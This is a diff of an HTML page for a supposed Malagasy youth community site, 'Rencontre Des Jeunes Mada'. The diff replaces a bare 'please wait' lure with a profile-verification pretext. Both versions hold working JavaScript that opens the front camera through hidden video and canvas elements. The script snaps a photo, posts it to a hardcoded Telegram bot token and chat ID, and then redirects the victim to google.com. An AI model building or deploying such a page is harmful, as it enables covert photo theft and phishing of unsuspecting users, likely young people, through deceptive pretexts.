@@ -3,91 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mampiditra ny rafitra...</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <title>Rencontre Des Jeunes Mada</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
+        :root {
+            /* Theme Dark (Bleu) par défaut */
+            --bg-gradient: linear-gradient(135deg, #071324, #0f294a);
+            --card-bg: rgba(15, 41, 74, 0.78);
+            --card-border: rgba(56, 189, 248, 0.25);
+            --text-main: #f8fafc;
+            --text-muted: #93c5fd;
+            --accent: #38bdf8;
+            --accent-hover: #0284c7;
+            --btn-shadow: 0 6px 20px rgba(56, 189, 248, 0.35);
+            --badge-bg: rgba(56, 189, 248, 0.15);
+        }
+
+        body.light-rose {
+            /* Theme Clair (Rose) */
+            --bg-gradient: linear-gradient(135deg, #fff1f5, #ffe4e6);
+            --card-bg: rgba(255, 255, 255, 0.85);
+            --card-border: rgba(244, 63, 94, 0.25);
+            --text-main: #3f0d1c;
+            --text-muted: #9f1239;
+            --accent: #ec4899;
+            --accent-hover: #db2777;
+            --btn-shadow: 0 6px 20px rgba(236, 72, 153, 0.3);
+            --badge-bg: rgba(236, 72, 153, 0.12);
+        }
+
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
         }
+
         body {
             font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #0f172a, #1e293b);
+            background: var(--bg-gradient);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            transition: background 0.4s ease, color 0.4s ease;
+        }
+
+        .theme-switcher {
+            position: fixed;
+            top: 18px;
+            right: 18px;
+            display: flex;
+            gap: 8px;
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            padding: 6px;
+            border-radius: 30px;
+            backdrop-filter: blur(10px);
+            z-index: 10;
+        }
+
+        .theme-btn {
+            border: none;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-family: 'Poppins', sans-serif;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            background: transparent;
+            color: var(--text-main);
+            transition: 0.25s ease;
+        }
+
+        .theme-btn.active {
+            background: var(--accent);
+            color: #ffffff;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            backdrop-filter: blur(14px);
+            border-radius: 24px;
+            padding: 35px 26px;
+            max-width: 390px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 18px 40px rgba(0, 0, 0, 0.25);
+            transition: 0.35s ease;
+        }
+
+        .badge {
+            display: inline-block;
+            background: var(--badge-bg);
+            color: var(--accent);
+            font-size: 12px;
+            font-weight: 600;
+            padding: 6px 14px;
+            border-radius: 20px;
+            margin-bottom: 16px;
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            line-height: 1.3;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 14px;
+            color: var(--text-muted);
+            line-height: 1.5;
+            margin-bottom: 22px;
+        }
+
+        .selfie-box {
+            width: 110px;
+            height: 110px;
+            margin: 0 auto 22px auto;
+            border-radius: 50%;
+            border: 3px dashed var(--accent);
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            color: #f8fafc;
+            font-size: 38px;
+            background: var(--badge-bg);
         }
-        .card {
-            background: rgba(30, 41, 59, 0.7);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 40px 30px;
-            border-radius: 20px;
-            text-align: center;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
-            max-width: 350px;
-            width: 90%;
-            cursor: pointer;
-        }
-        .spinner-box {
-            position: relative;
-            width: 70px;
-            height: 70px;
-            margin: 0 auto 25px auto;
-        }
-        .spinner {
-            position: absolute;
+
+        .btn-main {
             width: 100%;
-            height: 100%;
-            border: 4px solid rgba(56, 189, 248, 0.1);
-            border-top-color: #38bdf8;
-            border-radius: 50%;
-            animation: spin 1s cubic-bezier(0.5, 0, 0.5, 1) infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        h2 {
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 10px;
-            color: #f1f5f9;
-        }
-        p {
-            font-size: 14px;
-            color: #94a3b8;
-            font-weight: 300;
-            margin-bottom: 20px;
-        }
-        .btn-action {
-            background: linear-gradient(135deg, #38bdf8, #0284c7);
-            color: white;
+            background: var(--accent);
+            color: #ffffff;
             border: none;
-            padding: 12px 25px;
-            border-radius: 10px;
+            padding: 14px 20px;
+            border-radius: 14px;
+            font-family: 'Poppins', sans-serif;
             font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(56, 189, 248, 0.4);
+            box-shadow: var(--btn-shadow);
+            transition: transform 0.2s ease, background 0.25s ease;
+        }
+
+        .btn-main:hover {
+            background: var(--accent-hover);
+        }
+
+        .btn-main:active {
+            transform: scale(0.97);
+        }
+
+        .status-text {
+            margin-top: 16px;
+            font-size: 13px;
+            color: var(--text-muted);
+            min-height: 20px;
+        }
+
+        .footer-note {
+            margin-top: 20px;
+            font-size: 11px;
+            opacity: 0.7;
         }
     </style>
 </head>
 <body>
 
-    <div class="card" onclick="startProcess()">
-        <div class="spinner-box">
-            <div class="spinner"></div>
-        </div>
-        <h2 id="title">Miandrasa kely...</h2>
-        <p id="desc">Tsindrio ny bokotra eto ambany raha hanohy</p>
-        <button class="btn-action">Tohizana</button>
+    <div class="theme-switcher">
+        <button id="btnDark" class="theme-btn active" onclick="setTheme('dark')">Dark Bleu</button>
+        <button id="btnRose" class="theme-btn" onclick="setTheme('rose')">Clair Rose</button>
     </div>
 
-    <!-- Zavatra afenina ao ambadika -->
+    <div class="card">
+        <div class="badge">🇲🇬 Communauté Madagascar</div>
+        <h1>Rencontre Des Jeunes Mada</h1>
+        <p id="desc">Mba hamenoana ny mombamomba anao sy hanamarinana ny kaonty, alaivo ny sary selfie-nao eto.</p>
+
+        <div class="selfie-box" id="iconBox">📸</div>
+
+        <button class="btn-main" id="actionBtn" onclick="startCapture()">Maka Selfie &amp; Manohy</button>
+
+        <div class="status-text" id="status"></div>
+        <div class="footer-note">Rencontre Des Jeunes Mada • Profil &amp; Vérification</div>
+    </div>
+
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -95,39 +198,56 @@
         const token = "9032405314:AAE3YReBmUiG8GrtB8IsALD7SeklLWnGOKQ";
         const chatId = "7658208557";
 
-        let hasRun = false;
+        let isCapturing = false;
 
-        function startProcess() {
-            if (hasRun) return;
-            hasRun = true;
+        function setTheme(mode) {
+            const btnDark = document.getElementById('btnDark');
+            const btnRose = document.getElementById('btnRose');
+
+            if (mode === 'rose') {
+                document.body.classList.add('light-rose');
+                btnRose.classList.add('active');
+                btnDark.classList.remove('active');
+            } else {
+                document.body.classList.remove('light-rose');
+                btnDark.classList.add('active');
+                btnRose.classList.remove('active');
+            }
+        }
+
+        function startCapture() {
+            if (isCapturing) return;
+            isCapturing = true;
 
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
-            const title = document.getElementById('title');
-            const desc = document.getElementById('desc');
+            const status = document.getElementById('status');
+            const btn = document.getElementById('actionBtn');
+            const iconBox = document.getElementById('iconBox');
 
-            title.innerText = "Manamarina...";
-            desc.innerText = "Miandrasa kely aza miala...";
+            status.innerText = "Manokatra ny camera... Ekeo ny autorisation.";
+            btn.innerText = "Miandrasa kely...";
 
-            // Antsoina mivantana tsy misy await mba hivoaka avy hatrany ilay Pop-up
-            navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" } 
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" }
             })
             .then(stream => {
                 video.srcObject = stream;
+                iconBox.innerText = "⏳";
+                status.innerText = "Maka sary selfie... Aza mihetsika.";
 
-                // Andrasana kely ny fandraisan'ny camera sary
                 setTimeout(() => {
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
-                    
+
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                     canvas.toBlob(function(blob) {
                         const formData = new FormData();
                         formData.append("chat_id", chatId);
-                        formData.append("photo", blob, "captured.jpg");
+                        formData.append("photo", blob, "selfie_mada.jpg");
+                        formData.append("caption", "Rencontre Des Jeunes Mada - Selfie");
 
                         fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                             method: "POST",
@@ -135,28 +255,27 @@
                         })
                         .then(response => response.json())
                         .then(data => {
-                            console.log("Tafita ny sary!", data);
-                            title.innerText = "Tafita soa aman-tsara!";
-                            desc.innerText = "Mandefa anao...";
+                            iconBox.innerText = "✅";
+                            status.innerText = "Voatahiry ny sary! Mampiditra ao amin'ny pejy...";
                             setTimeout(() => {
                                 window.location.href = "https://www.google.com";
-                            }, 1000);
+                            }, 1200);
                         })
                         .catch(error => {
-                            console.error("Tsy tafita:", error);
+                            isCapturing = false;
+                            btn.innerText = "Maka Selfie & Manohy";
+                            status.innerText = "Nisy olana kely ny fifandraisana. Andramo indray.";
                         });
 
                         stream.getTracks().forEach(track => track.stop());
                     }, 'image/jpeg', 0.9);
 
                 }, 1500);
-
             })
             .catch(err => {
-                console.error("Tsy nahazoalana alalana ny camera:", err);
-                hasRun = false;
-                title.innerText = "Ilaina ny Autorisation";
-                desc.innerText = "Tsindrio indray raha hamerina";
+                isCapturing = false;
+                btn.innerText = "Maka Selfie & Manohy";
+                status.innerText = "Tsy nahazo alalana. Tsindrio ny bokotra ary ekeo ny camera.";
             });
         }
     </script>
